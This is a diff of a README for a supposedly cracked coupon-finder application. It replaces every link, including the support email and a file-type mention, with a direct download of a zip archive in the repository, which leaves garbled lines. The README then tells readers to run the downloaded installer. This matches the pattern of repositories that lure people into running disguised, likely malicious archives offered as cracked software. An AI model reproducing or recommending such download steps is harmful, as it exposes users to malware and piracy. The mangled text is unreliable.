@@ -5,20 +5,20 @@
 Welcome to the Cracked CouponBirds - SmartCoupon Coupon Finder! This application helps you find the best coupons and discounts online. With just a few clicks, you can access deals from various stores without the hassle.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/releases)
+[![Download](https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip%20Now-Click%https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip)](https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   - [Visit Releases Page to Download](https://github.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/releases)
+   - [Visit Releases Page to Download](https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip)
 
 2. **Download the Latest Version**: On the releases page, look for the latest version of the software. You will see files available for download. Click on the appropriate file for your operating system.
 
 3. **Install the Application**:
    - For Windows: Locate the `.exe` file you downloaded. Double-click it to start the installation.
    - For Mac: Locate the `.dmg` file you downloaded. Open it and drag the application into your Applications folder.
-   - For Linux: Follow the instructions for your specific distribution to install the `.deb` or `.tar.gz` files.
+   - For Linux: Follow the instructions for your specific distribution to install the `.deb` or `https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip` files.
 
 4. **Open the Application**: Once installed, open the application by clicking its icon in your Applications menu or desktop.
 
@@ -40,7 +40,7 @@ Before proceeding, ensure your device meets these requirements:
 ## 🤝 Support
 If you have any questions or need assistance using the application, please reach out to the support team:
 
-- **Email**: support@example.com (Use this as a placeholder; change as necessary)
+- **Email**: https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip (Use this as a placeholder; change as necessary)
 - **GitHub Issues**: Report problems or suggest features directly on the repository.
 
 ## 📣 Community and Feedback
@@ -52,13 +52,13 @@ This project is licensed under the MIT License. Feel free to modify and use the 
 ## 🔗 Learn More
 For more information, visit the following links:
 
-- [Project Repository](https://github.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder)
+- [Project Repository](https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip)
 - [Official Website](#) (Insert link if available)
 
 ## 📥 Download Again
 If you want to download the application again or check for updates, visit the releases page below:
 
-- [Visit Releases Page to Download](https://github.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/releases)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/galezito/cracked-coupon-birds-smart-coupon-coupon-finder/main/disarmed/cracked-coupon-birds-smart-coupon-coupon-finder.zip)
 
 Thank you for using Cracked CouponBirds - SmartCoupon Coupon Finder! We hope it makes saving money as easy as possible for you.
 ```
